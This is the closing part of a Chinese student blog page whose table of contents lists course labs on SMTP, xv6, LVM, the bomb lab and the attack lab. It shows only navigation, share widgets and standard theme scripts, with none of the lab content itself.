</span><br>


        
        转载注明出处，原文地址：<a href="/2019/10/03/linux文件管理实验/" target="_blank" rel="external">https://tjuyjn.top/2019/10/03/linux文件管理实验/</a>
        
    </div>
    <footer>
        <a href="https://tjuyjn.top">
            <img src="/img/avatar.jpg" alt="Anti-entropy">
            Anti-entropy
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OS/">OS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse/">Reverse</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/c语言/">c语言</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/smtp/">smtp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件系统/">文件系统</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/汇编/">汇编</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/10/03/linux文件管理实验/&title=《一些有趣的实验》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/10/03/linux文件管理实验/&title=《一些有趣的实验》 — Anti-entropy's blog&source=课上老师布置的一些实验的记录." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/10/03/linux文件管理实验/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《一些有趣的实验》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/10/03/linux文件管理实验/&via=https://tjuyjn.top" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/10/03/linux文件管理实验/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2019/10/30/MNIST/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">机器学习入门</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/09/25/杂篇/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">拼接图像</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实验合集"><span class="post-toc-number">1.</span> <span class="post-toc-text">实验合集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#计算机网络"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">计算机网络</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#smtp-发送伪造邮件"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">smtp 发送伪造邮件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#http-下的文件下载分析"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">http 下的文件下载分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#抓包分析"><span class="post-toc-number">1.1.2.1.</span> <span class="post-toc-text">抓包分析</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#操作系统"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">操作系统</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#linux-文件管理系统实验记录"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">linux 文件管理系统实验记录</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分配虚拟硬盘"><span class="post-toc-number">1.2.1.1.</span> <span class="post-toc-text">分配虚拟硬盘</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#创建和扩大文件系统和相关逻辑卷管理"><span class="post-toc-number">1.2.1.2.</span> <span class="post-toc-text">创建和扩大文件系统和相关逻辑卷管理</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#缩小文件系统和相关的逻辑卷管理"><span class="post-toc-number">1.2.1.3.</span> <span class="post-toc-text">缩小文件系统和相关的逻辑卷管理</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#bigger-files-for-xv6"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">bigger files for xv6</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#关于实验的一些概括性描述"><span class="post-toc-number">1.2.2.1.</span> <span class="post-toc-text">关于实验的一些概括性描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#安装-“big-工具”"><span class="post-toc-number">1.2.2.2.</span> <span class="post-toc-text">安装 “big 工具”</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析原fs-c文件中的代码"><span class="post-toc-number">1.2.2.3.</span> <span class="post-toc-text">分析原fs.c文件中的代码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#重写-bmap-函数"><span class="post-toc-number">1.2.2.4.</span> <span class="post-toc-text">重写 bmap()函数</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#xv6-system-calls"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">xv6 system calls</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#显示系统调用"><span class="post-toc-number">1.2.3.1.</span> <span class="post-toc-text">显示系统调用</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Date-system-call"><span class="post-toc-number">1.2.3.2.</span> <span class="post-toc-text">Date system call</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#计算机组成原理"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">计算机组成原理</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#bomb-从零开始的汇编世界之旅"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">bomb(从零开始的汇编世界之旅)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#phase-1"><span class="post-toc-number">1.3.1.1.</span> <span class="post-toc-text">phase_1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#phase-2"><span class="post-toc-number">1.3.1.2.</span> <span class="post-toc-text">phase_2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#phase-3"><span class="post-toc-number">1.3.1.3.</span> <span class="post-toc-text">phase_3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#phase-4"><span class="post-toc-number">1.3.1.4.</span> <span class="post-toc-text">phase_4</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#phase-5"><span class="post-toc-number">1.3.1.5.</span> <span class="post-toc-text">phase_5</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#phase-6"><span class="post-toc-number">1.3.1.6.</span> <span class="post-toc-text">phase_6</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#attack-lab"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">attack lab</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#任务一"><span class="post-toc-number">1.3.2.1.</span> <span class="post-toc-text">任务一</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#任务二"><span class="post-toc-number">1.3.2.2.</span> <span class="post-toc-text">任务二</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#任务三"><span class="post-toc-number">1.3.2.3.</span> <span class="post-toc-text">任务三</span></a></li></ol></li></ol></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        我们一起来让这个世界有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="https://www.lujingtao.com" target="_blank">主题作者</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.tjuscswyz.cn/" target="_blank">p4ssw0rd</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.cnblogs.com/ever17/" target="_blank">Ever17</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.cnblogs.com/tkj521Ya/" target="_blank">Exaggerate~</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://r1895.github.io" target="_blank">jason1999</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://tjublesson.top/" target="_blank">blesson</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://glimmerzcy.github.io" target="_blank">ZCY</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.csdn.net/Harry____" target="_blank">Harry____</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://daemon.tjunsa.com/" target="_blank">deamon</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Anti-entropy &copy; 2019 - 2020
            </span>
        		
           	
            
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/10/03/linux文件管理实验/&title=《一些有趣的实验》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/10/03/linux文件管理实验/&title=《一些有趣的实验》 — Anti-entropy's blog&source=课上老师布置的一些实验的记录." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/10/03/linux文件管理实验/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《一些有趣的实验》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/10/03/linux文件管理实验/&via=https://tjuyjn.top" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/10/03/linux文件管理实验/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACK0lEQVR42u3ay44iMQwFUP7/p2lpVtMLUtd20VIlJyuEIMlhYcqP1yte739r/f769f/r0z7rz9ywMDAwHst4L9f6WslVksvlP8HH3TAwMA5g3LX1+idIwuv6ux/fx8DAwAiCaRIWq1fEwMDAmG9XPaya6GJgYGBUk9hqYO2F8q/n4hgYGA9kVBsDf/n6i/0NDAyMhzDerTUvxs0T41/fwsDA2JqRtxjzWDdJYtcPlxc3xMDAOIyxHpXoPdLlyDxZvQi4GBgYWzAmg1zVoNlrakZ/AxgYGFsz8uOrR/bGLNYh/mIHDAyMIxnVIYm7Gg/VEh4GBsYJjMl2eemtl8o2S4QYGBgbMXphtFrEr56SfwYDA+MERu/SeUEtH9eYtxkwMDB2ZXxj0/y61WT4YroNAwNjU0avtVltMeatzckYGQYGxq6MPEXMH/KS8lxvn4tHQwwMjK0ZvSA7T3qT4BudgoGBcSRjfaH8cbC6emMZGBgYezN6pbS7ynO94lphug0DA2M7Rl786jUm57DXJMZjYGBsx5iktUmJP0mhk1MwMDDOYVRbj5OktzpgcUNoxsDAeDijVw6btDATRnnUAwMDY2tGNczddVivbDcP1hgYGM9l9IpoSdBMks9eshrl4hgYGNsx8uQzL7T1CnN5+hp1YjEwMI5kTEh5GC0/z2JgYGDEl6tetPdjYWBgnMmohss8IPb2L/dgMTAwtmZUGwN5wL1rXOM2EgYGxvMYP5Bn+gio9T66AAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '不要离开我！';
                clearTimeout(titleTime);
            } else {
                document.title = '嘤嘤嘤!太好了~';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
    <script type="text/javascript">           
        /* 鼠标特效 */ 
        var a_idx = 0; 
        jQuery(document).ready(function($) { 
            $("body").click(function(e) { 
                var a = new Array("❤好❤","❤看❤","❤就❤","❤留❤","❤个❤","❤言❤","❤吧❤"); 
                var $i = $("<span></span>").text(a[a_idx]); 
                a_idx = (a_idx + 1) % a.length; 
                var x = e.pageX, 
                y = e.pageY; 
                $i.css({ 
                    "z-index": 999999999999999999999999999999999999999999999999999999999999999999999, 
                    "top": y - 20, 
                    "left": x, 
                    "position": "absolute", 
                    "font-weight": "bold", 
                    "color": "rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")" 
                }); 
                $("body").append($i); 
                $i.animate({ 
                    "top": y - 180, 
                    "opacity": 0 
                }, 
                1500, 
                function() { 
                    $i.remove(); 
                }); 
            }); 
        }); 
    </script>
    <!--动态线条背景-->
    <script type="text/javascript" color="30,144,255" opacity='0.7' zIndex="-2" count="50" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>


</body>
</html>
